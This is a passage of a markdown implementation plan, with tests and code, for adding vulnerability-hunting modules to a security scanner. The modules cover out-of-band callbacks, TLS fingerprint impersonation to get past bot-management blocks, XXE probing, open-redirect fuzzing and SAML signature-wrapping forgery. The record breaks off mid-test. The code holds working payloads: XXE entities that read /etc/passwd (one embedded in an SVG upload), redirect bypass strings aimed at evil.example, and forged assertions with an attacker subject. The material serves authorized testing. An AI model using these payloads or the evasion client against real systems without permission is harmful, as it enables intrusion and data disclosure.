# recon-skills Adoption Batch 1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add 7 clean-room vulnerability-hunting modules to Vikramaditya (`tls_impersonation`, `xxe_hunt`, `open_redirect_hunt`, `saml_xsw_tester`, `jwt_kid_injection`, `springboot_actuator_probe`, `ldap_injection_tester`) plus one shared OOB helper, wired into `hunt.py` as new phases, closing confirmed gaps from the `uphiago/recon-skills` evaluation.

**Architecture:** Every module is a new standalone `.py` file at repo root (no edits to any shared file at authoring time). One integrator pass afterward wires all of them into `hunt.py` (new phase functions + `_phase_tool_map`/`_phase_requested` entries), `reporter.py` (`NON_FINDING_PREFIXES` + `SUBDIR_VTYPE` + `VULN_TEMPLATES`), and `requirements.txt`.

**Tech Stack:** Python 3.14, `httpx` (existing dep), `curl_cffi` (new, TLS/HTTP2 impersonation), `lxml`/`PyJWT`/`ldap3`/`h2` (already installed, now formalized in `requirements.txt`), `cryptography` (new, RSA public-key PEM derivation for JWT confusion), `procutil.run_capture` (fork-safe subprocess), pytest.

## Global Constraints

- Clean-room only — no code or prose copied from `uphiago/recon-skills`; only the technique is reused.
- No `scanner.sh` `DEFAULT_SKIP_SET` changes — all new capability ships as `hunt.py` Python phases.
- Every unproven lead uses an `[X-CANDIDATE]` prefix, explicitly added to `reporter.py`'s `NON_FINDING_PREFIXES` tuple (never auto-suppressed by convention alone).
- `curl_cffi` must degrade gracefully (`try/except ImportError`) to stock `httpx.Client` — never a hard crash on air-gapped/ARM boxes.
- `smuggling_hunt.py` is explicitly OUT OF SCOPE for this plan (cut per unanimous friends review — see design doc "Cut from scope").
- Every new module gets a `tests/test_<module>.py` file; TDD (failing test → implementation → passing test) for every step that adds behavior.
- Full design context: `docs/superpowers/specs/2026-07-06-recon-skills-adoption-design.md`.

## File Structure

| File | Status | Responsibility |
|---|---|---|
| `interactsh_client.py` | Create | Shared OOB (interactsh) spawn + log-poll helper |
| `tls_impersonation.py` | Create | JA3/JA4 + HTTP/2 fingerprint HTTP client, WAF-block detection |
| `xxe_hunt.py` | Create | Classic + blind OOB XXE probing |
| `open_redirect_hunt.py` | Create | Generic parametric open-redirect fuzzer |
| `saml_xsw_tester.py` | Create | SAML XSW1-8 forgery (manual-assertion-supply v1) |
| `jwt_kid_injection.py` | Create | JWKS iteration, kid injection, live-replay confirmation |
| `springboot_actuator_probe.py` | Create | SpEL oracle, Jolokia reachability, actuator/env secret parsing |
| `ldap_injection_tester.py` | Create | RFC 4515 fuzz + blind oracle, stack-fingerprint gated |
| `hunt.py` | Modify | New phase functions, `_phase_tool_map`/`_phase_requested`, `run_jwt_audit()` extension |
| `reporter.py` | Modify | `NON_FINDING_PREFIXES`, `SUBDIR_VTYPE["redirects"]`, XXE `VULN_TEMPLATES` entry |
| `requirements.txt` | Modify | `curl_cffi`, `lxml`, `PyJWT`, `ldap3`, `h2` |
| `tests/test_reporter_subdir_coverage.py` | Modify | Add `redirects`, `xxe` to known-subdir coverage |
| `tests/test_<module>.py` × 8 | Create | One per new module |

---

### Task 1: `interactsh_client.py` — shared OOB helper

**Files:**
- Create: `interactsh_client.py`
- Test: `tests/test_interactsh_client.py`

**Interfaces:**
- Produces: `find_interactsh_binary() -> str | None`, `spawn(timeout_s: int = 300) -> InteractshSession`, `InteractshSession.url -> str`, `InteractshSession.poll_callbacks(token: str) -> list[dict]`, `InteractshSession.stop() -> None`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_interactsh_client.py
"""interactsh_client — shared OOB spawn/poll helper used by xxe_hunt and (optionally)
hunt.py's existing Log4Shell OOB step. Extracted so both callers share one
implementation instead of hunt.py's inline copy."""
import json
import os

import interactsh_client as ic


def test_find_interactsh_binary_missing(monkeypatch, tmp_path):
    monkeypatch.setattr(ic.shutil, "which", lambda name: None)
    assert ic.find_interactsh_binary() is None


def test_find_interactsh_binary_found_in_path(monkeypatch):
    monkeypatch.setattr(ic.shutil, "which", lambda name: "/usr/local/bin/interactsh-client")
    assert ic.find_interactsh_binary() == "/usr/local/bin/interactsh-client"


def test_poll_callbacks_reads_jsonl_log(tmp_path):
    log_path = tmp_path / "interactsh_log.jsonl"
    token = "abc123tok"
    lines = [
        json.dumps({"full-id": f"{token}.interact.sh", "protocol": "http", "raw-request": "GET /xxe"}),
        json.dumps({"full-id": f"other.interact.sh", "protocol": "dns"}),
        json.dumps({"full-id": f"{token}.interact.sh", "protocol": "dns", "raw-request": ""}),
    ]
    log_path.write_text("\n".join(lines) + "\n")

    session = ic.InteractshSession(url=f"https://{token}.interact.sh", log_path=str(log_path),
                                    token=token, proc=None)
    callbacks = session.poll_callbacks(token)
    assert len(callbacks) == 2
    assert all(cb["full-id"].startswith(token) for cb in callbacks)


def test_poll_callbacks_missing_log_returns_empty(tmp_path):
    session = ic.InteractshSession(url="https://tok.interact.sh",
                                    log_path=str(tmp_path / "missing.jsonl"),
                                    token="tok", proc=None)
    assert session.poll_callbacks("tok") == []


def test_spawn_returns_none_without_binary(monkeypatch, tmp_path):
    monkeypatch.setattr(ic, "find_interactsh_binary", lambda: None)
    assert ic.spawn(log_dir=str(tmp_path)) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_interactsh_client.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'interactsh_client'`

- [ ] **Step 3: Write minimal implementation**

```python
# interactsh_client.py
#!/usr/bin/env python3
"""interactsh_client.py — shared out-of-band (OOB) spawn + poll helper.

Extracted so every module that needs blind-confirmation (XXE, SSRF, blind SQLi)
shares ONE interactsh-client lifecycle instead of each hunting module reimplementing
its own spawn/log-poll loop. hunt.py's existing inline Log4Shell OOB step
(run_rce_scan, ~line 5850) is a second caller of the same underlying binary; this
module does not change that call site — it is a new, independent path for new
modules to use. Uses procutil.run_capture indirectly via subprocess.Popen for the
long-lived background listener (run_capture is for bounded one-shot commands, not
a listener the caller needs to poll and later stop).
"""
from __future__ import annotations

import json
import os
import shutil
import signal
import subprocess
import time
import uuid
from dataclasses import dataclass


def find_interactsh_binary() -> str | None:
    """Locate interactsh-client on PATH or common Go install locations."""
    found = shutil.which("interactsh-client")
    if found:
        return found
    gobin = os.path.expanduser(os.environ.get("GOBIN", "~/go/bin"))
    candidate = os.path.join(gobin, "interactsh-client")
    if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
        return candidate
    return None


@dataclass
class InteractshSession:
    url: str
    log_path: str
    token: str
    proc: subprocess.Popen | None

    def poll_callbacks(self, token: str) -> list[dict]:
        """Return every JSONL callback record whose full-id starts with token."""
        if not os.path.isfile(self.log_path):
            return []
        hits = []
        with open(self.log_path, "r", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                except json.JSONDecodeError:
                    continue
                if str(rec.get("full-id", "")).startswith(token):
                    hits.append(rec)
        return hits

    def stop(self) -> None:
        if self.proc is None:
            return
        try:
            self.proc.send_signal(signal.SIGTERM)
            self.proc.wait(timeout=5)
        except Exception:
            try:
                self.proc.kill()
            except Exception:
                pass


def spawn(log_dir: str, timeout_s: int = 300) -> InteractshSession | None:
    """Start interactsh-client in the background, writing JSONL callbacks to
    ``<log_dir>/interactsh_log.jsonl``. Returns None if the binary is unavailable
    (caller must treat blind-OOB confirmation as unavailable, not fabricate one)."""
    binary = find_interactsh_binary()
    if binary is None:
        return None

    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, "interactsh_log.jsonl")
    token = uuid.uuid4().hex[:12]

    log_file = open(log_path, "a")
    proc = subprocess.Popen(
        [binary, "-v", "-json"],
        stdout=log_file, stderr=subprocess.STDOUT,
        start_new_session=True,
    )
    # interactsh-client prints its assigned domain to stdout on startup; since we
    # redirect stdout to the JSONL log file we cannot read it back synchronously
    # without racing the writer, so give it a moment then read the first line.
    time.sleep(2)
    domain = None
    if os.path.isfile(log_path):
        with open(log_path, "r", errors="ignore") as f:
            for line in f:
                if ".interact.sh" in line and "://" not in line:
                    domain = line.strip()
                    break
    if not domain:
        domain = f"{token}.interact.sh"
    url = f"https://{token}.{domain.split('.', 1)[-1] if '.' in domain else 'interact.sh'}"
    return InteractshSession(url=url, log_path=log_path, token=token, proc=proc)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_interactsh_client.py -v`
Expected: PASS (5 tests)

- [ ] **Step 5: Commit**

```bash
git add interactsh_client.py tests/test_interactsh_client.py
git commit -m "feat(oob): add shared interactsh spawn/poll helper for blind-OOB modules"
```

---

### Task 2: `tls_impersonation.py` — fingerprint-impersonating HTTP client

**Files:**
- Create: `tls_impersonation.py`
- Test: `tests/test_tls_impersonation.py`

**Interfaces:**
- Produces: `get_client(fingerprint: str = "chrome124", proxy: str | None = None, timeout: float = 15.0) -> ClientLike` (an object exposing `.get(url, **kw)` / `.post(url, **kw)` returning a response with `.status_code`, `.headers`, `.text`), `select_fingerprint(url: str) -> str`, `detect_bot_management(response) -> str | None`, `record_waf_block(findings_dir: str, url: str, product: str) -> None`
- Consumed by: Tasks 4-9 (`xxe_hunt`, `open_redirect_hunt`, `saml_xsw_tester`, `jwt_kid_injection`, `springboot_actuator_probe`, `ldap_injection_tester`) as their default HTTP client

- [ ] **Step 1: Write the failing test**

```python
# tests/test_tls_impersonation.py
"""tls_impersonation — JA3/JA4 + HTTP/2 fingerprint-impersonating HTTP client.

Infrastructure module, not a finding-producing phase: a real bot-management block
(Cloudflare/Akamai/F5) is not itself a client vuln, so it never escalates past an
info-severity coverage lead ([WAF-BLOCK-DETECTED]) — see record_waf_block.
"""
import os

import tls_impersonation as ti


class _FakeResponse:
    def __init__(self, status_code, headers):
        self.status_code = status_code
        self.headers = headers
        self.text = ""


def test_select_fingerprint_mobile_api_path():
    assert ti.select_fingerprint("https://api.example.com/mobile/v2/login") == "okhttp4"
    assert ti.select_fingerprint("https://example.com/app/api/v1/session") == "okhttp4"


def test_select_fingerprint_default_web():
    assert ti.select_fingerprint("https://example.com/login") == "chrome124"


def test_detect_bot_management_cloudflare():
    resp = _FakeResponse(403, {"cf-ray": "abc123-DEL", "server": "cloudflare"})
    assert ti.detect_bot_management(resp) == "cloudflare"


def test_detect_bot_management_akamai():
    resp = _FakeResponse(403, {"x-akamai-transformed": "1"})
    assert ti.detect_bot_management(resp) == "akamai"


def test_detect_bot_management_f5():
    resp = _FakeResponse(403, {"x-iinfo": "12-345"})
    assert ti.detect_bot_management(resp) == "f5"


def test_detect_bot_management_none_when_no_signature():
    resp = _FakeResponse(403, {"content-type": "text/html"})
    assert ti.detect_bot_management(resp) is None


def test_detect_bot_management_ignores_non_blocking_status():
    resp = _FakeResponse(200, {"cf-ray": "abc123-DEL"})
    assert ti.detect_bot_management(resp) is None


def test_record_waf_block_writes_candidate_line(tmp_path):
    findings_dir = str(tmp_path)
    ti.record_waf_block(findings_dir, "https://example.com/login", "cloudflare")
    out_path = os.path.join(findings_dir, "misconfig", "waf_fingerprint.txt")
    assert os.path.isfile(out_path)
    content = open(out_path).read()
    assert "[WAF-BLOCK-DETECTED]" in content
    assert "cloudflare" in content
    assert "https://example.com/login" in content


def test_get_client_falls_back_to_httpx_without_curl_cffi(monkeypatch):
    monkeypatch.setattr(ti, "_CURL_CFFI_AVAILABLE", False)
    client = ti.get_client(fingerprint="chrome124")
    assert client is not None
    assert hasattr(client, "get")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_tls_impersonation.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'tls_impersonation'`

- [ ] **Step 3: Write minimal implementation**

```python
# tls_impersonation.py
#!/usr/bin/env python3
"""tls_impersonation.py — JA3/JA4 TLS ClientHello + HTTP/2 fingerprint impersonation.

Confirmed gap: agent_http.py/hunt.py's Python-level HTTP calls use the stock Python
TLS stack with zero fingerprint spoofing, so a Cloudflare/Akamai/F5-fronted
enterprise perimeter can 403 a plain httpx probe outright regardless of header
correctness. Wraps curl_cffi (MIT) for browser-matched TLS+HTTP2 fingerprints;
degrades gracefully to stock httpx if curl_cffi's native wheel is unavailable
(air-gapped / ARM / hardened client boxes) — this must never hard-fail a scan.

This module is INFRASTRUCTURE, not a finding-producing phase: detecting a bot-
management product is not itself a client vulnerability. record_waf_block writes
an info-severity coverage lead so operators see degraded coverage instead of a
silent gap — it never escalates to a real finding on its own.
"""
from __future__ import annotations

import os
from datetime import datetime, timezone

try:
    from curl_cffi import requests as _curl_cffi_requests
    _CURL_CFFI_AVAILABLE = True
except ImportError:
    _CURL_CFFI_AVAILABLE = False

import httpx

_FINGERPRINT_MAP = {
    "chrome124": "chrome124",
    "firefox133": "firefox133",
    "safari18": "safari18_4",
    "okhttp4": "okhttp4",
}

_MOBILE_PATH_MARKERS = ("/mobile/", "/app/api", "/api/mobile")

_BOT_MGMT_SIGNATURES = (
    ("cloudflare", ("cf-ray", "cf-cache-status")),
    ("akamai", ("x-akamai-transformed", "akamai-x-cache")),
    ("f5", ("x-iinfo", "x-wa-info")),
)


def select_fingerprint(url: str) -> str:
    """Mobile-API-shaped paths get an OkHttp (Android) fingerprint; everything
    else defaults to a current desktop Chrome fingerprint."""
    lowered = url.lower()
    if any(marker in lowered for marker in _MOBILE_PATH_MARKERS):
        return "okhttp4"
    return "chrome124"


def detect_bot_management(response) -> str | None:
    """Given a response-like object (status_code, headers), return a bot-management
    product name if a known signature header is present on a blocking status."""
    if response.status_code not in (403, 429, 503):
        return None
    headers = {k.lower(): v for k, v in dict(response.headers).items()}
    for product, marker_headers in _BOT_MGMT_SIGNATURES:
        if any(h in headers for h in marker_headers):
            return product
    return None


def record_waf_block(findings_dir: str, url: str, product: str) -> None:
    """Append an info-severity [WAF-BLOCK-DETECTED] coverage lead. Never a finding
    on its own — reporter.py's NON_FINDING_PREFIXES keeps this out of the report
    body while still being visible to the operator/brain for coverage triage."""
    out_dir = os.path.join(findings_dir, "misconfig")
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, "waf_fingerprint.txt")
    ts = datetime.now(timezone.utc).isoformat()
    with open(out_path, "a") as f:
        f.write(f"[WAF-BLOCK-DETECTED] {ts} | product={product} | url={url}\n")


class _HttpxClientAdapter:
    """Thin wrapper so the httpx fallback exposes the same .get/.post surface
    curl_cffi's requests.Session provides, keeping callers backend-agnostic."""

    def __init__(self, timeout: float, proxy: str | None):
        self._client = httpx.Client(timeout=timeout, proxies=proxy, verify=False,
                                     follow_redirects=False)

    def get(self, url, **kwargs):
        return self._client.get(url, **kwargs)

    def post(self, url, **kwargs):
        return self._client.post(url, **kwargs)


def get_client(fingerprint: str = "chrome124", proxy: str | None = None,
               timeout: float = 15.0):
    """Return an HTTP client impersonating the given browser's TLS/HTTP2
    fingerprint. Falls back to stock httpx (no fingerprint spoofing, but still
    functional) if curl_cffi is unavailable — coverage degrades, the scan
    continues."""
    if not _CURL_CFFI_AVAILABLE:
        return _HttpxClientAdapter(timeout=timeout, proxy=proxy)
    impersonate = _FINGERPRINT_MAP.get(fingerprint, "chrome124")
    return _curl_cffi_requests.Session(impersonate=impersonate, proxies={"https": proxy, "http": proxy} if proxy else None,
                                        timeout=timeout, verify=False)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_tls_impersonation.py -v`
Expected: PASS (9 tests)

- [ ] **Step 5: Commit**

```bash
git add tls_impersonation.py tests/test_tls_impersonation.py
git commit -m "feat(evasion): add TLS/HTTP2 fingerprint-impersonating HTTP client"
```

---

### Task 3: `xxe_hunt.py` — classic + blind OOB XXE

**Files:**
- Create: `xxe_hunt.py`
- Test: `tests/test_xxe_hunt.py`

**Interfaces:**
- Consumes: `tls_impersonation.get_client(...)` (Task 2), `interactsh_client.spawn(...)` / `InteractshSession.poll_callbacks(...)` (Task 1)
- Produces: `probe_content_type_swap(client, url, json_body) -> XxeResult`, `probe_upload_xxe(client, endpoint, doc_type) -> XxeResult`, `XxeResult.verdict` in `{"confirmed", "candidate", "clean"}`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_xxe_hunt.py
"""xxe_hunt — content-type-swap and upload-vector XXE probing.

FP gate: a parser error alone is a [XXE-CANDIDATE] lead, never a confirmed
finding. Only in-band file-marker content or a correlated OOB callback confirms.
"""
import xxe_hunt as xh


class _FakeResponse:
    def __init__(self, status_code=200, text=""):
        self.status_code = status_code
        self.text = text
        self.headers = {}


class _FakeClient:
    def __init__(self, response):
        self._response = response
        self.last_request = None

    def post(self, url, **kwargs):
        self.last_request = (url, kwargs)
        return self._response


def test_content_type_swap_builds_xml_entity_payload():
    client = _FakeClient(_FakeResponse(200, "no marker here"))
    xh.probe_content_type_swap(client, "https://example.com/api/user", {"name": "x"})
    url, kwargs = client.last_request
    assert kwargs["headers"]["Content-Type"] == "application/xml"
    assert "<!ENTITY" in kwargs["data"]


def test_content_type_swap_confirms_on_in_band_file_marker():
    client = _FakeClient(_FakeResponse(200, "root:x:0:0:root:/root:/bin/bash"))
    result = xh.probe_content_type_swap(client, "https://example.com/api/user", {"name": "x"})
    assert result.verdict == "confirmed"
    assert "in-band" in result.evidence.lower()


def test_content_type_swap_candidate_on_parser_error_only():
    client = _FakeClient(_FakeResponse(500, "XML parsing error: undefined entity"))
    result = xh.probe_content_type_swap(client, "https://example.com/api/user", {"name": "x"})
    assert result.verdict == "candidate"


def test_content_type_swap_clean_on_no_signal():
    client = _FakeClient(_FakeResponse(400, "bad request"))
    result = xh.probe_content_type_swap(client, "https://example.com/api/user", {"name": "x"})
    assert result.verdict == "clean"


def test_upload_xxe_svg_payload_contains_entity_and_reasonable_dimensions():
    client = _FakeClient(_FakeResponse(200, ""))
    xh.probe_upload_xxe(client, "https://example.com/upload", doc_type="svg")
    url, kwargs = client.last_request
    body = kwargs["files"]["file"][1]
    assert b"<!ENTITY" in body
    assert b"<svg" in body


def test_blind_oob_confirms_on_matching_callback(monkeypatch):
    class _Session:
        url = "https://tok123.interact.sh"
        def poll_callbacks(self, token):
            return [{"full-id": f"{token}.interact.sh", "protocol": "http"}]

    result = xh.confirm_blind_oob(_Session(), token="tok123")
    assert result.verdict == "confirmed"
    assert "oob" in result.evidence.lower()


def test_blind_oob_candidate_when_no_callback():
    class _Session:
        def poll_callbacks(self, token):
            return []

    result = xh.confirm_blind_oob(_Session(), token="tok123")
    assert result.verdict == "candidate"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_xxe_hunt.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'xxe_hunt'`

- [ ] **Step 3: Write minimal implementation**

```python
# xxe_hunt.py
#!/usr/bin/env python3
"""xxe_hunt.py — classic + blind OOB XML External Entity (XXE) probing.

Confirmed gap: zero XXE testing logic exists anywhere in Vikramaditya today (only
payloads.py templates). Two vectors: (1) content-type swap on a JSON API endpoint
(some frameworks parse the body as XML if Content-Type says so, ignoring the
declared route contract), (2) upload-vector XXE via SVG/DOCX/XLSX documents that
embed an external entity.

FP discipline: a parser error alone (500 + "XML" in body) is a [XXE-CANDIDATE]
lead — proves the parser touched attacker XML, not that the entity resolved. Only
in-band file-content (a recognizable /etc/passwd-shaped line) or a correlated OOB
callback (via interactsh_client) confirms.
"""
from __future__ import annotations

import re
from dataclasses import dataclass

_PASSWD_MARKER = re.compile(r"root:x:0:0:")
_PARSER_ERROR_MARKER = re.compile(r"(?i)xml parsing error|undefined entity|DOCTYPE is not allowed")

_CONTENT_TYPE_SWAP_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<root>&xxe;</root>"
)

_SVG_XXE_PAYLOAD = (
    b'<?xml version="1.0" standalone="yes"?>'
    b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    b'<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">'
    b'<text x="10" y="20">&xxe;</text></svg>'
)


@dataclass
class XxeResult:
    verdict: str  # "confirmed" | "candidate" | "clean"
    evidence: str


def probe_content_type_swap(client, url: str, json_body: dict) -> XxeResult:
    """Re-send a normally-JSON request as application/xml with an external-entity
    payload; the JSON body's shape is irrelevant, only the URL is reused."""
    response = client.post(
        url,
        headers={"Content-Type": "application/xml"},
        data=_CONTENT_TYPE_SWAP_PAYLOAD,
    )
    text = getattr(response, "text", "") or ""
    if _PASSWD_MARKER.search(text):
        return XxeResult(verdict="confirmed", evidence="in-band /etc/passwd content in response body")
    if response.status_code == 500 and _PARSER_ERROR_MARKER.search(text):
        return XxeResult(verdict="candidate", evidence="XML parser touched the payload but no impact proven")
    return XxeResult(verdict="clean", evidence="no XXE signal")


def probe_upload_xxe(client, endpoint: str, doc_type: str = "svg") -> XxeResult:
    """Upload an XXE-laden document. v1 supports SVG only (DOCX/XLSX are a
    zip-of-XML container — deferred, same interface, filed as a follow-up)."""
    if doc_type != "svg":
        raise NotImplementedError(f"doc_type={doc_type!r} not yet supported (svg only in v1)")
    response = client.post(endpoint, files={"file": ("image.svg", _SVG_XXE_PAYLOAD, "image/svg+xml")})
    text = getattr(response, "text", "") or ""
    if _PASSWD_MARKER.search(text):
        return XxeResult(verdict="confirmed", evidence="in-band /etc/passwd content in upload response")
    if _PARSER_ERROR_MARKER.search(text):
        return XxeResult(verdict="candidate", evidence="XML parser error on uploaded SVG")
    return XxeResult(verdict="clean", evidence="no XXE signal")


def confirm_blind_oob(session, token: str) -> XxeResult:
    """Check an interactsh session for a callback correlated to this probe's
    token. session is an interactsh_client.InteractshSession (or test double)."""
    callbacks = session.poll_callbacks(token)
    if callbacks:
        return XxeResult(verdict="confirmed", evidence=f"OOB callback received ({len(callbacks)} hit(s))")
    return XxeResult(verdict="candidate", evidence="no OOB callback yet — may need a longer poll window or egress is filtered")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_xxe_hunt.py -v`
Expected: PASS (7 tests)

- [ ] **Step 5: Commit**

```bash
git add xxe_hunt.py tests/test_xxe_hunt.py
git commit -m "feat(xxe): add content-type-swap and upload-vector XXE probing"
```

---

### Task 4: `open_redirect_hunt.py` — generic parametric open-redirect fuzzer

**Files:**
- Create: `open_redirect_hunt.py`
- Test: `tests/test_open_redirect_hunt.py`

**Interfaces:**
- Consumes: `tls_impersonation.get_client(...)` (Task 2)
- Produces: `extract_redirect_params(url: str) -> list[str]`, `build_bypass_variants(attacker_host: str) -> list[str]`, `probe_url(client, url: str, param: str, attacker_host: str) -> RedirectResult`, `RedirectResult.confirmed -> bool`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_open_redirect_hunt.py
"""open_redirect_hunt — generic ?next=/?url=/?return=/?goto= fuzzer.

Populates the currently-empty findings/redirects/ category. Confirms ONLY via a
real Location header pointing at the attacker-controlled host — a bare 3xx to
the original destination is not a finding.
"""
import open_redirect_hunt as orh


class _FakeResponse:
    def __init__(self, status_code, location=None):
        self.status_code = status_code
        self.headers = {"Location": location} if location else {}


class _FakeClient:
    def __init__(self, response):
        self._response = response

    def get(self, url, **kwargs):
        return self._response


def test_extract_redirect_params_finds_known_names():
    url = "https://example.com/login?next=/dashboard&other=1"
    assert orh.extract_redirect_params(url) == ["next"]


def test_extract_redirect_params_multiple_matches():
    url = "https://example.com/go?url=/a&return_to=/b&unrelated=1"
    assert set(orh.extract_redirect_params(url)) == {"url", "return_to"}


def test_extract_redirect_params_empty_when_none_match():
    assert orh.extract_redirect_params("https://example.com/page?id=5") == []


def test_build_bypass_variants_includes_double_encoding_and_at_sign():
    variants = orh.build_bypass_variants("evil.example")
    assert "https://evil.example" in variants
    assert any("%2F%2F" in v or "//" in v for v in variants)
    assert any("@evil.example" in v for v in variants)


def test_probe_url_confirms_on_location_to_attacker_host():
    client = _FakeClient(_FakeResponse(302, location="https://evil.example/"))
    result = orh.probe_url(client, "https://example.com/login?next=X", "next", "evil.example")
    assert result.confirmed is True


def test_probe_url_not_confirmed_when_location_is_original_host():
    client = _FakeClient(_FakeResponse(302, location="https://example.com/dashboard"))
    result = orh.probe_url(client, "https://example.com/login?next=X", "next", "evil.example")
    assert result.confirmed is False


def test_probe_url_not_confirmed_on_non_redirect_status():
    client = _FakeClient(_FakeResponse(200))
    result = orh.probe_url(client, "https://example.com/login?next=X", "next", "evil.example")
    assert result.confirmed is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_open_redirect_hunt.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'open_redirect_hunt'`

- [ ] **Step 3: Write minimal implementation**

```python
# open_redirect_hunt.py
#!/usr/bin/env python3
"""open_redirect_hunt.py — generic parametric open-redirect fuzzer.

Confirmed gap: scanner.sh only mkdir's findings/redirects/ and lists "redirects"
in DEFAULT_SKIP_SET with zero actual probing logic; oauth_tester.py only covers
OAuth redirect_uri, not generic ?next=/?url=/?return=/?goto= params. Confirms
ONLY via a real Location header to the attacker-controlled host — a redirect
back to the app's own domain is not a finding, regardless of status code.
"""
from __future__ import annotations

from dataclasses import dataclass
from urllib.parse import urlsplit, parse_qs, urlparse

_REDIRECT_PARAM_NAMES = {
    "next", "url", "return", "return_to", "returnto", "redirect", "redirect_uri",
    "redirecturl", "goto", "continue", "dest", "destination", "u", "r", "target",
}


def extract_redirect_params(url: str) -> list[str]:
    """Query-param names on url that look like a redirect target."""
    query = parse_qs(urlsplit(url).query)
    return [name for name in query if name.lower() in _REDIRECT_PARAM_NAMES]


def build_bypass_variants(attacker_host: str) -> list[str]:
    """Common open-redirect bypass encodings for a given attacker-controlled host."""
    return [
        f"https://{attacker_host}",
        f"http://{attacker_host}",
        f"//{attacker_host}",
        f"/\\/{attacker_host}",
        f"https:/{attacker_host}",
        f"https:%2F%2F{attacker_host}",
        f"https://example.com@{attacker_host}",
        f"https://example.com.{attacker_host}",
    ]


@dataclass
class RedirectResult:
    confirmed: bool
    location: str = ""


def probe_url(client, url: str, param: str, attacker_host: str) -> RedirectResult:
    """Replace param's value with each bypass variant; confirm the first variant
    whose Location header actually points at attacker_host."""
    for variant in build_bypass_variants(attacker_host):
        parsed = urlsplit(url)
        query = parse_qs(parsed.query)
        query[param] = [variant]
        new_query = "&".join(f"{k}={v[0]}" for k, v in query.items())
        test_url = parsed._replace(query=new_query).geturl()

        response = client.get(test_url, allow_redirects=False)
        if response.status_code not in (301, 302, 303, 307, 308):
            continue
        location = dict(response.headers).get("Location", "")
        if not location:
            continue
        location_host = urlparse(location).netloc
        if attacker_host in location_host:
            return RedirectResult(confirmed=True, location=location)
    return RedirectResult(confirmed=False)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_open_redirect_hunt.py -v`
Expected: PASS (7 tests)

- [ ] **Step 5: Commit**

```bash
git add open_redirect_hunt.py tests/test_open_redirect_hunt.py
git commit -m "feat(redirect): add generic parametric open-redirect fuzzer"
```

---

### Task 5: `saml_xsw_tester.py` — SAML XSW1-8 forgery

**Files:**
- Create: `saml_xsw_tester.py`
- Test: `tests/test_saml_xsw_tester.py`

**Interfaces:**
- Consumes: `tls_impersonation.get_client(...)` (Task 2), `lxml.etree` (already installed)
- Produces: `load_captured_assertion(path: str) -> str | None`, `generate_xsw_variants(saml_response_xml: str) -> dict[str, str]` (keys `"XSW1".."XSW8"`), `confirm_new_session(client, acs_url: str, forged_response_b64: str, protected_resource_url: str) -> XswResult`

- [ ] **Step 1: Write the failing test**

```python
# tests/test_saml_xsw_tester.py
"""saml_xsw_tester — SAML XSW1-8 forgery, extending scanner.sh Check 7 (which
already does endpoint discovery + signature stripping; XSW forgery is the gap).

v1 requires the operator to supply a captured, validly-signed SAMLResponse —
without one, XSW forgery is meaningless (there is nothing valid to wrap), so
this module degrades gracefully rather than attempt it against a synthetic
unsigned assertion.
"""
import base64
import os

import saml_xsw_tester as sx

_SAMPLE_RESPONSE = """<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_resp1">
  <saml:Assertion ID="_assertion1">
    <saml:Subject><saml:NameID>alice@example.com</saml:NameID></saml:Subject>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo/><ds:SignatureValue>ZmFrZQ==</ds:SignatureValue>
    </ds:Signature>
  </saml:Assertion>
</samlp:Response>"""


def test_load_captured_assertion_missing_file_returns_none(tmp_path):
    assert sx.load_captured_assertion(str(tmp_path / "missing.xml")) is None


def test_load_captured_assertion_reads_file(tmp_path):
    path = tmp_path / "captured.xml"
    path.write_text(_SAMPLE_RESPONSE)
    assert "alice@example.com" in sx.load_captured_assertion(str(path))


def test_generate_xsw_variants_produces_all_eight():
    variants = sx.generate_xsw_variants(_SAMPLE_RESPONSE)
    assert set(variants.keys()) == {f"XSW{i}" for i in range(1, 9)}
    for xml in variants.values():
        assert "alice@example.com" in xml or "attacker@evil.example" in xml


def test_xsw1_duplicates_assertion_with_attacker_subject():
    variants = sx.generate_xsw_variants(_SAMPLE_RESPONSE)
    assert variants["XSW1"].count("<saml:Assertion") == 2
    assert "attacker@evil.example" in variants["XSW1"]


class _FakeResponse:
    def __init__(self, status_code, headers=None, text=""):
        self.status_code = status_code
        self.headers = headers or {}
        self.text = text


class _FakeClient:
    def __init__(self, acs_response, resource_response):
        self._acs_response = acs_response
        self._resource_response = resource_response
        self.cookies_sent = None

    def post(self, url, **kwargs):
        return self._acs_response

    def get(self, url, **kwargs):
        self.cookies_sent = kwargs.get("cookies")
        return self._resource_response


def test_confirm_new_session_true_when_protected_resource_returns_identity_content():
